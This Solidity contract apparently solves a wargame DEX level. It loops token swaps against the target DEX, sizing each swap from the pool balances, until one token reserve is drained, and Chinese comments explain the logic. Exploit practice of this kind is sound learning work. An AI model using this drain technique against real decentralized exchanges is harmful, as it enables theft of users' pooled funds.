// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "hardhat/console.sol";

interface ILevel{
  function swap(address from, address to, uint amount) external;
}

interface IToken{
  function approve(address spender, uint amount) external;
  function balanceOf(address account) external view returns (uint);
}

contract DexRun {
  function run(address _runAddress,address _token1,address _token2) external {
    uint myToken1Amount;
    uint myToken2Amount;
    uint dexToken1Amount;
    uint dexToken2Amount;
    uint currentSwap = 0;

    while (true) {
      myToken1Amount = IToken(_token1).balanceOf(address(this));
      myToken2Amount = IToken(_token2).balanceOf(address(this));      
      dexToken1Amount = IToken(_token1).balanceOf(_runAddress);
      dexToken2Amount = IToken(_token2).balanceOf(_runAddress);

      //有一个token抽干就退出
      if (dexToken1Amount <= 0 || dexToken2Amount <= 0) {
        break;
      }

      if (myToken1Amount >=myToken2Amount) {
        //根据dex的价格公式，如果需要抽干to,只需from个，所以判断下如果比from大，就用from即可
        currentSwap = myToken1Amount > dexToken1Amount ? dexToken1Amount : myToken1Amount;
        IToken(_token1).approve(_runAddress,currentSwap);
        ILevel(_runAddress).swap(_token1, _token2, currentSwap);       
      } else {        
        currentSwap = myToken2Amount > dexToken2Amount ? dexToken2Amount : myToken2Amount;
        IToken(_token2).approve(_runAddress,currentSwap);
        ILevel(_runAddress).swap(_token2, _token1, currentSwap);
      }            
    }

  }  
}